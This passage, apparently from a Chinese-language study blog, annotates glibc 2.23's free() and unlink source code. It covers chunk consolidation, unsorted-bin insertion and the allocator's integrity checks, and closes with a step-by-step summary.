            nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // 获取chunk p的下一个chunk是否在使用，是通过下下个的prev_inuse来的

            /* consolidate forward */
            // 假如下一个chunk也是free状态，那么发生前向合并
            if (!nextinuse)
            {
                // 将下一个chunk进行unlink，
                unlink(av, nextchunk, bck, fwd);
                size += nextsize; // 前向合并简单，只需要说把p的size增大就可以了
            }
            else
                clear_inuse_bit_at_offset(nextchunk, 0); // 假如下一个chunk还在使用，由于p马上要释放了，因此把下一个chunk的prev_inuse设置为free

            /*
        Place the chunk in unsorted chunk list. Chunks are
        not placed into regular bins until after they have
        been given one chance to be used in malloc.
            */
            // 要放到unsorted bin中去了，首先将unsortedbin的头指针设置为bck
            bck = unsorted_chunks(av);
            fwd = bck->fd; // unsortedbin中第一个chunk设置为fwd
            if (__glibc_unlikely(fwd->bk != bck)) // 假如unsortedbin的第一个chunk的bk不指向unsortedbin了，出错了
            {
                errstr = "free(): corrupted unsorted chunks";
                goto errout;
            }
            // p要插入到unsortedbin的头部，也就是头指针和第一个chunk之间
            p->fd = fwd;
            p->bk = bck;
            // 假如size属于largebin，这个时候还要设置它的fd_nextsize指针和bk_nextsize指针
            if (!in_smallbin_range(size))
            {
                p->fd_nextsize = NULL;
                p->bk_nextsize = NULL;
            }
            bck->fd = p; // 头指针的fd指向p
            fwd->bk = p; // 之前的第一个chunk的bk指向p

            // 设置对应的位
            set_head(p, size | PREV_INUSE);
            set_foot(p, size);
            
            // 检查是不是真的已经释放了
            check_free_chunk(av, p);
        }

        /*
          If the chunk borders the current high end of memory,
          consolidate into top
        */

        else
        // 假如它的下一个chunk是top chunk，那么和top chunk进行合并
        {
            size += nextsize; // 加上top chunk的大小
            set_head(p, size | PREV_INUSE); // 设置标志位
            av->top = p; // 合并之后的chunk成为新的top chunk
            check_chunk(av, p); // 检查是否合法
        }

        /*
          If freeing a large space, consolidate possibly-surrounding
          chunks. Then, if the total unused topmost memory exceeds trim
          threshold, ask malloc_trim to reduce top.

          Unless max_fast is 0, we don't know if there are fastbins
          bordering top, so we cannot tell for sure whether threshold
          has been reached unless fastbins are consolidated.  But we
          don't want to consolidate on each free.  As a compromise,
          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
          is reached.
        */
        // 假如合并之后的大小大于fastbin合并的阈值
        if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD)
        {
            // 假如有fast chunk，那么将它们合并
            if (have_fastchunks(av))
                malloc_consolidate(av);

            if (av == &main_arena)
            {
#ifndef MORECORE_CANNOT_TRIM
                if ((unsigned long)(chunksize(av->top)) >=
                    (unsigned long)(mp_.trim_threshold))
                    systrim(mp_.top_pad, av);
#endif
            }
            else
            {
                /* Always try heap_trim(), even if the top chunk is not
                   large, because the corresponding heap might go away.  */
                heap_info *heap = heap_for_ptr(top(av));

                assert(heap->ar_ptr == av);
                heap_trim(heap, mp_.top_pad);
            }
        }

        if (!have_lock)
        {
            assert(locked);
            (void)mutex_unlock(&av->mutex);
        }
    }
    /*
      If the chunk was allocated via mmap, release via munmap().
    */
   // 假如是通过mmap映射的chunk，那么应该munmap_chunk()函数将其释放
    else
    {
        munmap_chunk(p);
    }
}
```

总结一下`glibc 2.23`中的`free`的流程：

- 开始之前是一系列的安全检查，包括：
  - 要释放的地址指针是否越界，是否没对齐
  - 要释放的`chunk`大小不能小于`minsize`
- 检查其是不是属于`fastbin`范围内。若是，首先进行安全检查，检查要释放的`chunk`的下一个`chunk`大小是否小于`minsize`，或者大于`maxsize`。通过安全检查后，计算其属于哪一个`fastbin`，获得该`bin`的头指针，并以此获得与该头指针相连的`chunk`。若该`chunk`就是要释放的`chunk`，那么说明进行了`double free`，会报错。确认无误会将`chunk`加入到这个`fastbin`。若加入的`fastbin`不是最开始计算得到的`fastbin`，那么报错。
- 若其不是`fastbin`范围内，会检查是不是`mmap`映射得到的内存区域，若是，那么则交给函数`munmap_chunk()`处理。
- 若其不是`fastbin`范围内且不是`mmap`映射的内存区域，那么流程继续。先进行安全检查：
  - 要释放的`chunk`是`top chunk`，那么会报错
  - 若内存区域不再连续，报错
  - 若要释放的`chunk`的下一个`chunk`的内存地址比`top chunk`要大，那么报错
  - 检查下一个`chunk`的`prev_inuse`字段，若下一个`chunk`显示该`chunk`为`free`状态，那么报错`double free`
  - 若要释放的`chunk`的下一个`chunk`大于最大值或者小于最小值，那么报错
- 通过安全检查，若该`chunk`的前一个`chunk`处于`free`状态，那么会发生后向合并。将该`chunk`的地址加上前一个`chunk`的大小，并将前一个`chunk`进行`unlink`。注意，即使这里发生了后向合并也要继续往下运行。
- 判断要释放的`chunk`的下一个`chunk`是不是`top chunk`。若是`top chunk`，那么将会和`top chunk`发生合并：该`chunk`的大小将加上`top chunk`的大小，并且成为新的`top chunk`。
- 若不是`top chunk`，那么检查要释放的`chunk`的后一个`chunk`是不是处于`free`状态。若是，则发生前向合并，当前的`chunk`大小将会加上后一个`chunk`的大小，并且后一个`chunk`将会进行`unlink`。若后一个`chunk`不是`free`状态，那么需要把后一个`chunk`的`prev_inuse`设置为0。
- 上面的步骤已经完成了合并操作，而且其不是`fastbin`，那么我们接下来需要将其置入`unsortedbin`中。首先进行安全检查，若`unsortedbin`中的第一个`chunk`的`bk`指针没有指向`unsortedbin`，那么报错。将要释放的`chunk`插入到`unsortedbin`头指针和本来的第一个`chunk`之间即可。若其是`large chunk`，那么还需要将`fd_nextsize`指针和`bk_nextsize`指针设为`NULL`。
- 到这里`free`的过程就已经结束了。

# unlink源码解读

```c
#define unlink(AV, P, BK, FD)
{
    // 将要被unlink的chunk叫做P
    FD = P->fd; // FD是P的fd
    BK = P->bk; // BK是P的bk
    // 安全检查，实际上就是P->fd->bk == P, P->bk->fd == P
    if (__builtin_expect(FD->bk != P || BK->fd != P, 0)) 
        malloc_printerr(check_action, "corrupted double-linked list", P, AV);
    else
    {
        // 通过安全检查
        // FD的bk将不再是P，而是BK
        FD->bk = BK;
        // BK的fd将不再是P，而是FD
        BK->fd = FD;
        // 不是largebin的话，unlink在这也就结束了
        
        // 假如在large bin范围内。
        // 若P不是含有fd_nextsize和bk_nextsize的那个节点，就结束了，若是还要继续往下
        if (!in_smallbin_range(P->size) && __builtin_expect(P->fd_nextsize != NULL, 0))
        {
            // largebin的额外安全检查，其实和上面类似，检查fd_nextsize和bk_nextsize
            if (__builtin_expect(P->fd_nextsize->bk_nextsize != P, 0) || __builtin_expect(P->bk_nextsize->fd_nextsize != P, 0))
                malloc_printerr(check_action, "corrupted double-linked list (not small)", P, AV);
            
            // 假如FD的fd_nextsize本来为NULL，说明FD不是该大小的第一个
            // 回想largebin的取出方式，它一定是取出该大小的第二个，也就是除了有fd_nextsize的属性的头的第一个
            if (FD->fd_nextsize == NULL)
            {
                // 那么分情况：P是不是这个largebin里面唯一一个chunk
                if (P->fd_nextsize == P)
                    // 假如是，那么BK和FD实际上largebin头
                    FD->fd_nextsize = FD->bk_nextsize = FD; 
                else
                {
                    FD->fd_nextsize = P->fd_nextsize; 
                    FD->bk_nextsize = P->bk_nextsize;
                    P->fd_nextsize->bk_nextsize = FD;
                    P->bk_nextsize->fd_nextsize = FD;
                }
            }
            else // 假如FD的fd_nextsize本来是有值的，说明它是这个大小的第一个且是唯一一个（largebin最后才取这个大小的头）
            {   //且P被unlink了，那么P这个大小也是唯一一个，那么BK也含有fd_nextsize和bk_nextsize
                // 和small bin类似
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;
            }
        }
    }
}
```

